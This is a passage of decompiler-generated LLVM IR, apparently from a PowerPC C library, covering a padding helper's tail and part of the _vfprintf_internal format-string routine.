  %v3_1000bb48 = trunc i32 %v1_1000bb2c to i8
  %v4_1000bb48 = call i32 @_charpad(i32 %v0_1000bb34, i8 %v3_1000bb48, i32 %v2_1000bb38)
  %v0_1000bb4c = load i32, i32* @r31, align 4
  store i32 %v0_1000bb4c, i32* %r30.global-to-local, align 4
  %v1_1000bb50 = load i32, i32* @r29, align 4
  %v4_1000bb50 = icmp eq i32 %v4_1000bb48, %v1_1000bb50
  store i32 %v4_1000bb48, i32* @r28, align 4
  br i1 %v4_1000bb50, label %dec_label_pc_1000bb48.dec_label_pc_1000bb5c_crit_edge, label %dec_label_pc_1000bb80

dec_label_pc_1000bb48.dec_label_pc_1000bb5c_crit_edge: ; preds = %dec_label_pc_1000bb48
  %v0_1000bb68.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000bb5c

dec_label_pc_1000bb5c:                            ; preds = %dec_label_pc_1000bb48.dec_label_pc_1000bb5c_crit_edge, %dec_label_pc_1000bb28, %entry
  %v0_1000bb68 = phi i32 [ %v0_1000bb68.pre, %dec_label_pc_1000bb48.dec_label_pc_1000bb5c_crit_edge ], [ %v0_1000bb34, %dec_label_pc_1000bb28 ], [ %arg1, %entry ]
  %v0_1000bb64 = phi i32 [ %v0_1000bb4c, %dec_label_pc_1000bb48.dec_label_pc_1000bb5c_crit_edge ], [ %v0_1000bb28, %dec_label_pc_1000bb28 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000bb64, 1
  br i1 %tmp8, label %dec_label_pc_1000bb7c, label %dec_label_pc_1000bb74

dec_label_pc_1000bb74:                            ; preds = %dec_label_pc_1000bb5c
  %v0_1000bb60 = load i32, i32* @r27, align 4
  store i32 268483448, i32* @lr, align 4
  %v3_1000bb74 = inttoptr i32 %v0_1000bb68 to i16*
  %v4_1000bb74 = call i32 @__stdio_fwrite(i32 %v0_1000bb60, i32 %v0_1000bb64, i16* %v3_1000bb74)
  br label %dec_label_pc_1000bb7c

dec_label_pc_1000bb7c:                            ; preds = %dec_label_pc_1000bb5c, %dec_label_pc_1000bb74
  %v1_1000bb7c = phi i32 [ 0, %dec_label_pc_1000bb5c ], [ %v4_1000bb74, %dec_label_pc_1000bb74 ]
  %v0_1000bb7c = load i32, i32* @r28, align 4
  %v2_1000bb7c = add i32 %v0_1000bb7c, %v1_1000bb7c
  br label %dec_label_pc_1000bb80

dec_label_pc_1000bb80:                            ; preds = %dec_label_pc_1000bb48, %dec_label_pc_1000bb7c
  %v0_1000bb84 = phi i32 [ %v4_1000bb48, %dec_label_pc_1000bb48 ], [ %v2_1000bb7c, %dec_label_pc_1000bb7c ]
  ret i32 %v0_1000bb84

; uselistorder directives
  uselistorder i32 %v0_1000bb64, { 1, 0 }
  uselistorder i32 %v2_1000bb38, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb80, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb7c, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000bb9c = load i32, i32* @lr, align 4
  store i32 %v0_1000bb9c, i32* %r0.global-to-local, align 4
  %v2_1000bba4 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000bba4, i32* %r30.global-to-local, align 4
  %v0_1000bba8 = load i32, i32* @r3, align 4
  store i32 %v0_1000bba8, i32* %r24.global-to-local, align 4
  %v0_1000bbb4 = load i32, i32* @r5, align 4
  store i32 %v0_1000bbb4, i32* %r31.global-to-local, align 4
  %v0_1000bbb8 = load i32, i32* @r4, align 4
  store i32 %v0_1000bbb8, i32* @r29, align 4
  store i32 268483520, i32* @lr, align 4
  %v1_1000bbbc = bitcast i8** %stack_var_-200 to i32*
  %v2_1000bbbc = call i32 @_ppfs_init(i32* %v1_1000bbbc)
  %tmp72 = icmp sgt i32 %v2_1000bbbc, -1
  br i1 %tmp72, label %dec_label_pc_1000bbf0, label %dec_label_pc_1000bbc8

dec_label_pc_1000bbc8:                            ; preds = %entry
  %v3_1000bbc8 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000bbc8 = ptrtoint i8* %v3_1000bbc8 to i32
  store i32 %v4_1000bbc8, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000bbc8, i32* @r3, align 4
  %v0_1000bbd4 = call i32 @__GI_strlen()
  %v3_1000bbd8 = icmp eq i32 %v0_1000bbd4, 0
  br i1 %v3_1000bbd8, label %dec_label_pc_1000c1f0, label %dec_label_pc_1000bbe0

dec_label_pc_1000bbe0:                            ; preds = %dec_label_pc_1000bbc8
  %v0_1000bbe0 = load i32, i32* @r31, align 4
  %v0_1000bbe4 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000bbec.840 to i32), i32* @lr, align 4
  %v3_1000bbe8 = inttoptr i32 %v0_1000bbe4 to i16*
  %v4_1000bbe8 = call i32 @__stdio_fwrite(i32 %v0_1000bbe0, i32 %v0_1000bbd4, i16* %v3_1000bbe8)
  br label %dec_label_pc_1000c1f0

dec_label_pc_1000bbf0:                            ; preds = %entry
  %v0_1000bbf4 = load i32, i32* @r31, align 4
  store i32 268483580, i32* @lr, align 4
  %v2_1000bbf8 = call i32 @_ppfs_prepargs(i32 %v2_1000bba4, i32 %v0_1000bbf4)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000bc90 = zext i8 %tmp59 to i32
  %v2_1000bc94 = icmp sgt i32 %tmp60, 0
  %v2_1000bc98 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000bcbc = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000bcc0 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000bcf4 = icmp eq i32 %tmp57, 0
  %v2_1000c050 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000bf70 = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000bf74 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000bde8 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000bec4 = icmp eq i32 %tmp57, 1
  %v2_1000be68 = icmp ugt i32 %tmp57, 2
  %v4_1000bda8 = zext i8 %tmp55 to i32
  %v0_1000c1dc.pre = load i32, i32* @r29, align 4
  %v1_1000bca8 = mul nuw nsw i32 %v4_1000bc90, 8
  %v2_1000bcac = add i32 %v2_1000bc98, %v1_1000bca8
  %v1_1000bcb0 = add i32 %v2_1000bcac, -8
  %v1_1000bcc4 = add i32 %tmp58, 1
  %v2_1000bd1c = icmp ugt i32 %tmp57, 7
  %v2_1000befc = icmp ugt i32 %tmp57, 15
  %v2_1000bf30 = icmp ugt i32 %tmp57, 17
  %v3_1000bf30 = icmp eq i32 %tmp57, 17
  %v2_1000bfd8 = icmp ugt i32 %tmp57, 19
  %v3_1000bfd8 = icmp eq i32 %tmp57, 19
  %v3_1000c044 = icmp eq i32 %tmp57, 20
  %v1_1000bd34 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1001c89c.842 to i32), i32 -1)
  %v2_1000bd34 = inttoptr i32 %v1_1000bd34 to i8*
  %v3_1000be74 = icmp eq i32 %tmp57, 3
  %v3_1000be84 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000c1dc

dec_label_pc_1000bc08.backedge:                   ; preds = %dec_label_pc_1000bc5c, %dec_label_pc_1000bc14
  %storemerge13.in = phi i32 [ %v1_1000bc24, %dec_label_pc_1000bc14 ], [ %v1_1000bc5c, %dec_label_pc_1000bc5c ]
  %v1_1000bc1c16 = phi i32 [ %v0_1000bc34, %dec_label_pc_1000bc14 ], [ %v1_1000bc5c, %dec_label_pc_1000bc5c ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000bc08

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bc08.backedge, %dec_label_pc_1000c1dc
  %v0_1000bc34 = phi i32 [ %v1_1000bc1c16, %dec_label_pc_1000bc08.backedge ], [ %v0_1000c1dc, %dec_label_pc_1000c1dc ]
  %v1_1000bc24 = phi i32 [ %storemerge13, %dec_label_pc_1000bc08.backedge ], [ %v0_1000c1dc, %dec_label_pc_1000c1dc ]
  %v1_1000bc08 = inttoptr i32 %v1_1000bc24 to i8*
  %v2_1000bc08 = load i8, i8* %v1_1000bc08, align 1
  %v3_1000bc08 = zext i8 %v2_1000bc08 to i32
  store i32 %v3_1000bc08, i32* %r0.global-to-local, align 4
  %v3_1000bc0c = icmp eq i8 %v2_1000bc08, 0
  br i1 %v3_1000bc0c, label %dec_label_pc_1000bc1c, label %dec_label_pc_1000bc14

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc08
  %v3_1000bc14 = icmp eq i8 %v2_1000bc08, 37
  br i1 %v3_1000bc14, label %dec_label_pc_1000bc1c, label %dec_label_pc_1000bc08.backedge

dec_label_pc_1000bc1c:                            ; preds = %dec_label_pc_1000bc14, %dec_label_pc_1000bc08
  %v4_1000bc1c = icmp eq i32 %v1_1000bc24, %v0_1000bc34
  br i1 %v4_1000bc1c, label %dec_label_pc_1000bc50, label %dec_label_pc_1000bc24

dec_label_pc_1000bc24:                            ; preds = %dec_label_pc_1000bc1c
  %v2_1000bc24 = sub i32 %v1_1000bc24, %v0_1000bc34
  store i32 %v2_1000bc24, i32* @r31, align 4
  %v4_1000bc24 = icmp sgt i32 %v2_1000bc24, 0
  br i1 %v4_1000bc24, label %dec_label_pc_1000bc34, label %dec_label_pc_1000bc44

dec_label_pc_1000bc34:                            ; preds = %dec_label_pc_1000bc24
  %v0_1000bc3c = load i32, i32* %r24.global-to-local, align 4
  store i32 268483652, i32* @lr, align 4
  %v3_1000bc40 = inttoptr i32 %v0_1000bc3c to i16*
  %v4_1000bc40 = call i32 @__stdio_fwrite(i32 %v0_1000bc34, i32 %v2_1000bc24, i16* %v3_1000bc40)
  %v1_1000bc44.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bc44

dec_label_pc_1000bc44:                            ; preds = %dec_label_pc_1000bc24, %dec_label_pc_1000bc34
  %v1_1000bc4c = phi i32 [ %v1_1000bc44.pre, %dec_label_pc_1000bc34 ], [ %v2_1000bc24, %dec_label_pc_1000bc24 ]
  %storemerge2 = phi i32 [ %v4_1000bc40, %dec_label_pc_1000bc34 ], [ 0, %dec_label_pc_1000bc24 ]
  %v4_1000bc44 = icmp eq i32 %storemerge2, %v1_1000bc4c
  br i1 %v4_1000bc44, label %dec_label_pc_1000bc4c, label %dec_label_pc_1000c1ec

dec_label_pc_1000bc4c:                            ; preds = %dec_label_pc_1000bc44
  %v0_1000bc4c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000bc4c = add i32 %v0_1000bc4c, %v1_1000bc4c
  store i32 %v2_1000bc4c, i32* %r23.global-to-local, align 4
  %v0_1000bc50.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000bc50

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc1c, %dec_label_pc_1000bc4c
  %v0_1000bc5c = phi i32 [ %v0_1000bc34, %dec_label_pc_1000bc1c ], [ %v0_1000bc50.pre, %dec_label_pc_1000bc4c ]
  %v1_1000bc50 = inttoptr i32 %v0_1000bc5c to i8*
  %v2_1000bc50 = load i8, i8* %v1_1000bc50, align 1
  %v3_1000bc50 = zext i8 %v2_1000bc50 to i32
  store i32 %v3_1000bc50, i32* %r0.global-to-local, align 4
  %v3_1000bc54 = icmp eq i8 %v2_1000bc50, 0
  br i1 %v3_1000bc54, label %dec_label_pc_1000c1f0, label %dec_label_pc_1000bc5c

dec_label_pc_1000bc5c:                            ; preds = %dec_label_pc_1000bc50
  %v1_1000bc5c = add i32 %v0_1000bc5c, 1
  %v2_1000bc5c = inttoptr i32 %v1_1000bc5c to i8*
  %v3_1000bc5c = load i8, i8* %v2_1000bc5c, align 1
  %v4_1000bc5c = zext i8 %v3_1000bc5c to i32
  store i32 %v4_1000bc5c, i32* %r0.global-to-local, align 4
  %v3_1000bc64 = icmp eq i8 %v3_1000bc5c, 37
  br i1 %v3_1000bc64, label %dec_label_pc_1000bc08.backedge, label %dec_label_pc_1000bc6c

dec_label_pc_1000bc6c:                            ; preds = %dec_label_pc_1000bc5c
  store i32 %v2_1000bba4, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000bc5c, i8** %stack_var_-200, align 4
  store i32 268483716, i32* @lr, align 4
  %v3_1000bc80 = call i32 @_ppfs_parsespec(i32* %v1_1000bbbc, i32 %v1_1000bc5c)
  store i32 %v2_1000bba4, i32* @r3, align 4
  store i32 268483724, i32* @lr, align 4
  %v0_1000bc88 = call i32 @_ppfs_setargs()
  store i32 %v4_1000bc90, i32* @r7, align 4
  store i32 %v2_1000bc98, i32* %r0.global-to-local, align 4
  br i1 %v2_1000bc94, label %dec_label_pc_1000bca8, label %dec_label_pc_1000bcb4

dec_label_pc_1000bca8:                            ; preds = %dec_label_pc_1000bc6c
  br label %dec_label_pc_1000bcb4

dec_label_pc_1000bcb4:                            ; preds = %dec_label_pc_1000bc6c, %dec_label_pc_1000bca8
  %v0_1000bce082 = phi i32 [ %v1_1000bcb0, %dec_label_pc_1000bca8 ], [ %v2_1000bc98, %dec_label_pc_1000bc6c ]
  store i32 %v0_1000bce082, i32* %r10.global-to-local, align 4
  store i32 %v2_1000bcbc, i32* @r8, align 4
  store i32 %v1_1000bcc4, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000bce4.preheader, label %dec_label_pc_1000bce4.preheader.thread

dec_label_pc_1000bce4.preheader.thread:           ; preds = %dec_label_pc_1000bcb4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000bcf0

dec_label_pc_1000bce4.preheader:                  ; preds = %dec_label_pc_1000bcb4
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000bcc0, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000bcdc.preheader

dec_label_pc_1000bcdc.preheader:                  ; preds = %dec_label_pc_1000bce4.preheader
  store i32 %v0_1000bce082, i32* %stack_var_-344, align 4
  %v1_1000bce083 = add i32 %v0_1000bce082, 8
  store i32 %v1_1000bce083, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000bcec88 = add i32 %tmp58, -1
  store i32 %v1_1000bcec88, i32* %ctr.global-to-local, align 4
  %v2_1000bcec89 = icmp eq i32 %v1_1000bcec88, 0
  br i1 %v2_1000bcec89, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge

dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge: ; preds = %dec_label_pc_1000bcdc.preheader, %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge.dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge_crit_edge
  %v1_1000bcdc.pre = phi i32 [ %v1_1000bcdc.pre.pre, %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge.dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge_crit_edge ], [ %v2_1000bcbc, %dec_label_pc_1000bcdc.preheader ]
  %v1_1000bce491 = phi i32 [ %v1_1000bce4, %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge.dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000bcdc.preheader ]
  %v1_1000bce090 = phi i32 [ %v1_1000bce0, %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge.dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge_crit_edge ], [ %v1_1000bce083, %dec_label_pc_1000bcdc.preheader ]
  %v3_1000bcdc = add i32 %v1_1000bcdc.pre, %v1_1000bce491
  %v4_1000bcdc = inttoptr i32 %v3_1000bcdc to i32*
  store i32 %v1_1000bce090, i32* %v4_1000bcdc, align 4
  %v0_1000bce0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bce0 = add i32 %v0_1000bce0, 8
  store i32 %v1_1000bce0, i32* %r10.global-to-local, align 4
  %v0_1000bce4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bce4 = mul i32 %v0_1000bce4, 4
  store i32 %v1_1000bce4, i32* %r0.global-to-local, align 4
  %v1_1000bce8 = add i32 %v0_1000bce4, 1
  store i32 %v1_1000bce8, i32* %r11.global-to-local, align 4
  %v0_1000bcec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bcec = add i32 %v0_1000bcec, -1
  store i32 %v1_1000bcec, i32* %ctr.global-to-local, align 4
  %v2_1000bcec = icmp eq i32 %v1_1000bcec, 0
  br i1 %v2_1000bcec, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge.dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge_crit_edge

dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge.dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge_crit_edge: ; preds = %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge
  %v1_1000bcdc.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge

dec_label_pc_1000bcf0:                            ; preds = %dec_label_pc_1000bcdc.preheader, %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge, %dec_label_pc_1000bce4.preheader.thread, %dec_label_pc_1000bce4.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000bcf4, label %dec_label_pc_1000bcfc, label %dec_label_pc_1000bd1c

dec_label_pc_1000bcfc:                            ; preds = %dec_label_pc_1000bcf0
  %v0_1000bd00 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000bd00, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000bd00, 0
  %v1_1000bd08 = zext i1 %tmp96 to i32
  %v2_1000bd08 = ashr i32 %v0_1000bd00, 31
  %v3_1000bd08 = and i32 %v2_1000bd08, -2
  %v4_1000bd08 = or i32 %v3_1000bd08, %v1_1000bd08
  store i32 %v4_1000bd08, i32* @r5, align 4
  %v1_1000bd10 = call i32 @__asm_rlwinm(i32 %v0_1000be30, i32 0, i32 20, i32 23)
  store i32 %v1_1000bd10, i32* @r4, align 4
  %v1_1000bd14 = inttoptr i32 %v1_1000bd10 to i16*
  %v2_1000bd14 = call i32 @_store_inttype(i16* %v1_1000bd14)
  br label %dec_label_pc_1000c1d8

dec_label_pc_1000bd1c:                            ; preds = %dec_label_pc_1000bcf0
  br i1 %v2_1000bd1c, label %dec_label_pc_1000befc, label %dec_label_pc_1000bd24

dec_label_pc_1000bd24:                            ; preds = %dec_label_pc_1000bd1c
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000bd34 = load i8, i8* %v2_1000bd34, align 1
  %v4_1000bd34 = zext i8 %v3_1000bd34 to i32
  store i32 %v4_1000bd34, i32* %r30.global-to-local, align 4
  %v3_1000bd38 = icmp eq i8 %v3_1000bd34, 10
  br i1 %v3_1000bd38, label %dec_label_pc_1000bd40, label %dec_label_pc_1000bd68

dec_label_pc_1000bd40:                            ; preds = %dec_label_pc_1000bd24
  store i32 %v0_1000be30, i32* %r0.global-to-local, align 4
  %v1_1000bd44 = call i32 @__asm_rlwinm(i32 %v0_1000be30, i32 26, i32 31, i32 31)
  %v1_1000bd48 = call i32 @__asm_rlwinm(i32 %v0_1000be30, i32 27, i32 31, i32 31)
  %v3_1000bd4c = icmp eq i32 %v1_1000bd44, 0
  %v2_1000bd50 = icmp ne i32 %v1_1000bd48, 0
  %not.v2_1000bd50 = xor i1 %v2_1000bd50, true
  %v6_1000bd54 = sext i1 %not.v2_1000bd50 to i32
  store i32 %v6_1000bd54, i32* %r0.global-to-local, align 4
  %v1_1000bd5c = select i1 %v2_1000bd50, i32 44, i32 87
  store i32 %v1_1000bd5c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000bd4c, label %dec_label_pc_1000bd68, label %dec_label_pc_1000bd64

dec_label_pc_1000bd64:                            ; preds = %dec_label_pc_1000bd40
  %v1_1000bd64 = or i32 %v1_1000bd5c, 128
  store i32 %v1_1000bd64, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bd68

dec_label_pc_1000bd68:                            ; preds = %dec_label_pc_1000bd24, %dec_label_pc_1000bd40, %dec_label_pc_1000bd64
  %v0_1000bd68 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000bd68 = icmp ugt i32 %v0_1000bd68, 5
  br i1 %v2_1000bd68, label %dec_label_pc_1000bd90, label %dec_label_pc_1000bd70

dec_label_pc_1000bd70:                            ; preds = %dec_label_pc_1000bd68
  %v3_1000bd70 = icmp eq i32 %v0_1000bd68, 3
  br i1 %v3_1000bd70, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bd80

dec_label_pc_1000bd78:                            ; preds = %dec_label_pc_1000bd70
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bd94

dec_label_pc_1000bd80:                            ; preds = %dec_label_pc_1000bd70
  %v3_1000bd80 = icmp eq i32 %v0_1000bd68, 1
  br i1 %v3_1000bd80, label %dec_label_pc_1000bd98, label %dec_label_pc_1000bd94

dec_label_pc_1000bd90:                            ; preds = %dec_label_pc_1000bd68
  %v0_1000bd90 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000bd90 = sub i32 0, %v0_1000bd90
  store i32 %v1_1000bd90, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bd94

dec_label_pc_1000bd94:                            ; preds = %dec_label_pc_1000bd80, %dec_label_pc_1000bd78, %dec_label_pc_1000bd90
  br label %dec_label_pc_1000bd98

dec_label_pc_1000bd98:                            ; preds = %dec_label_pc_1000bd80, %dec_label_pc_1000bd94
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000bd94 ], [ 6, %dec_label_pc_1000bd80 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000bd98 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000bd98, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000bd98, -1
  br i1 %tmp75, label %dec_label_pc_1000bdac, label %dec_label_pc_1000bda8

dec_label_pc_1000bda8:                            ; preds = %dec_label_pc_1000bd98
  br label %dec_label_pc_1000bdac

dec_label_pc_1000bdac:                            ; preds = %dec_label_pc_1000bd98, %dec_label_pc_1000bda8
  %storemerge = phi i32 [ %v4_1000bda8, %dec_label_pc_1000bda8 ], [ 32, %dec_label_pc_1000bd98 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000bdac = icmp eq i32 %v0_1000bd68, 1
  br i1 %v3_1000bdac, label %dec_label_pc_1000bdc8, label %dec_label_pc_1000bdb8

dec_label_pc_1000bdb8:                            ; preds = %dec_label_pc_1000bdac
  %v0_1000bdb8 = load i32, i32* @r7, align 4
  %v1_1000bdb8 = mul i32 %v0_1000bdb8, 4
  store i32 %v1_1000bdb8, i32* %r0.global-to-local, align 4
  %v0_1000bdbc = load i32, i32* @r1, align 4
  %v2_1000bdbc = add i32 %v0_1000bdbc, %v1_1000bdb8
  %v1_1000bdc0 = add i32 %v2_1000bdbc, 188
  %v2_1000bdc0 = inttoptr i32 %v1_1000bdc0 to i32*
  %v3_1000bdc0 = load i32, i32* %v2_1000bdc0, align 4
  store i32 %v3_1000bdc0, i32* %r0.global-to-local, align 4
  %v1_1000bdc4 = call i32 @__asm_rlwinm(i32 %v3_1000bdc0, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000bdc8

dec_label_pc_1000bdc8:                            ; preds = %dec_label_pc_1000bdac, %dec_label_pc_1000bdb8
  %v3_1000bdc8 = load i32, i32* %stack_var_-344, align 4
  %v0_1000bdcc = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000bdcc, i32* @r5, align 4
  %v2_1000bdd0 = inttoptr i32 %v0_1000bdcc to i32*
  %v3_1000bdd0 = call i32 @_load_inttype(i32 %v3_1000bdc8, i32* %v2_1000bdd0)
  %v0_1000bde0 = load i32, i32* %r31.global-to-local, align 4
  %v6_1000bde8 = call i32 @_uintmaxtostr(i8* %v5_1000bde8, i32 %v3_1000bdd0, i32 %v3_1000bdc8, i32 %v0_1000bdcc, i32 %v0_1000bde0)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000bde8, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000be3c, label %dec_label_pc_1000bdfc

dec_label_pc_1000bdfc:                            ; preds = %dec_label_pc_1000bdc8
  %v7_1000bde8 = inttoptr i32 %v6_1000bde8 to i8*
  %v3_1000bdfc = load i8, i8* %v7_1000bde8, align 1
  %v4_1000bdfc = zext i8 %v3_1000bdfc to i32
  store i32 %v4_1000bdfc, i32* %r0.global-to-local, align 4
  %v3_1000be04 = icmp eq i8 %v3_1000bdfc, 45
  br i1 %v3_1000be04, label %dec_label_pc_1000be0c, label %dec_label_pc_1000be20

dec_label_pc_1000be0c:                            ; preds = %dec_label_pc_1000bdfc
  %v1_1000be0c = or i32 %v0_1000be30, 2
  store i32 %v1_1000be0c, i32* %r0.global-to-local, align 4
  %v2_1000be10 = add i32 %v6_1000bde8, 1
  store i32 %v2_1000be10, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000be3c

dec_label_pc_1000be20:                            ; preds = %dec_label_pc_1000bdfc
  %v1_1000be20 = and i32 %v0_1000be30, 2
  store i32 %v1_1000be20, i32* %r0.global-to-local, align 4
  %v3_1000be20 = icmp eq i32 %v1_1000be20, 0
  br i1 %v3_1000be20, label %dec_label_pc_1000be30, label %dec_label_pc_1000be28

dec_label_pc_1000be28:                            ; preds = %dec_label_pc_1000be20
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000be3c

dec_label_pc_1000be30:                            ; preds = %dec_label_pc_1000be20
  %v1_1000be30 = urem i32 %v0_1000be30, 2
  store i32 %v1_1000be30, i32* %r11.global-to-local, align 4
  %v3_1000be30 = icmp eq i32 %v1_1000be30, 0
  br i1 %v3_1000be30, label %dec_label_pc_1000be3c, label %dec_label_pc_1000be38

dec_label_pc_1000be38:                            ; preds = %dec_label_pc_1000be30
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000be3c

dec_label_pc_1000be3c:                            ; preds = %dec_label_pc_1000be30, %dec_label_pc_1000bdc8, %dec_label_pc_1000be28, %dec_label_pc_1000be0c, %dec_label_pc_1000be38
  %v0_1000bea8 = phi i32 [ %v6_1000bde8, %dec_label_pc_1000bdc8 ], [ %v2_1000be10, %dec_label_pc_1000be0c ], [ %v6_1000bde8, %dec_label_pc_1000be30 ], [ %v6_1000bde8, %dec_label_pc_1000be38 ], [ %v6_1000bde8, %dec_label_pc_1000be28 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000be30, %dec_label_pc_1000bdc8 ], [ %v1_1000be0c, %dec_label_pc_1000be0c ], [ %v0_1000be30, %dec_label_pc_1000be30 ], [ %v0_1000be30, %dec_label_pc_1000be38 ], [ %v0_1000be30, %dec_label_pc_1000be28 ]
  %v3_1000be3c = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000c050, i32* %r0.global-to-local, align 4
  %v2_1000be44 = sub i32 %v2_1000c050, %v0_1000bea8
  %v1_1000be4c = add i32 %v2_1000be44, 127
  store i32 %v1_1000be4c, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000be3c, -1
  br i1 %tmp76, label %dec_label_pc_1000be58, label %dec_label_pc_1000be54

dec_label_pc_1000be54:                            ; preds = %dec_label_pc_1000be3c
  br label %dec_label_pc_1000be58

dec_label_pc_1000be58:                            ; preds = %dec_label_pc_1000be3c, %dec_label_pc_1000be54
  %v0_1000be8c = phi i32 [ %v3_1000be3c, %dec_label_pc_1000be3c ], [ 1, %dec_label_pc_1000be54 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000be5c = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000be5c, i32* %r11.global-to-local, align 4
